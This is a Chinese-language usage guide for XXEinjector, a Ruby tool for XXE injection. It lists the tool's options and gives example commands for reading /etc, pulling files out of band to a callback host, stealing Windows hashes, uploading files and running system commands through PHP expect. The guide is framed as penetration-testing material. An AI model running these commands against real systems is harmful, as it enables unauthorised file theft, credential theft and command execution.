## XXEinjector 自动化XXE注射工具

https://github.com/ianxtianxt/XXEinjector

> XXEinjector本身提供了非常非常丰富的操作选项，所以大家在利用XXEinjector进行渗透测试之前，请自习了解这些配置选项，以最大限度地发挥XXEinjector的功能。当然了，由于XXEinjector是基于Ruby开发的，所以Ruby运行环境就是必须的了。

```bash
--host     必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)
--file      必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)
--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)
--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)
--logger        记录输出结果。
--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)
--rport          远程主机的TCP端口信息。(--rport=8080)
--phpfilter    在发送消息之前使用PHP过滤器对目标文件进行Base64编码。
--netdoc     使用netdoc协议。(Java).
--enumports   枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)
--hashes       窃取运行当前应用程序用户的Windows哈希。
--expect        使用PHP expect扩展执行任意系统命令。(--expect=ls)
--upload       使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)
--xslt      XSLT注入测试。
--ssl              使用SSL。
--proxy         使用代理。(--proxy=127.0.0.1:8080)
--httpport Set自定义HTTP端口。(--httpport=80)
--ftpport       设置自定义FTP端口。(--ftpport=21)
--gopherport  设置自定义gopher端口。(--gopherport=70)
--jarport       设置自定义文件上传端口。(--jarport=1337)
--xsltport  设置自定义用于XSLT注入测试的端口。(--xsltport=1337)
--test     该模式可用于测试请求的有效。
--urlencode     URL编码，默认为URI。
--output       爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)
--timeout     设置接收文件/目录内容的Timeout。(--timeout=20)
--contimeout  设置与服务器断开连接的，防止DoS出现。(--contimeout=20)
--fast     跳过枚举询问，有可能出现结果假阳性。
--verbose     显示verbose信息。

```

## XXEinjector使用样例

枚举HTTPS应用程序中的/etc目录：

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl

```

使用gopher（OOB方法）枚举/etc目录：

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher

```

二次漏洞利用：

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt

```

使用HTTP带外方法和netdoc协议对文件进行爆破攻击：

```bash
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc

```

通过直接性漏洞利用方式进行资源枚举：

```bash
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK

```

枚举未过滤的端口：

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all

```

窃取Windows哈希：

```
ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes

```

使用Java jar上传文件：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf

```

使用PHP expect执行系统指令：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls

```

测试XSLT注入：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt

```

记录请求信息：

```
ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt

```

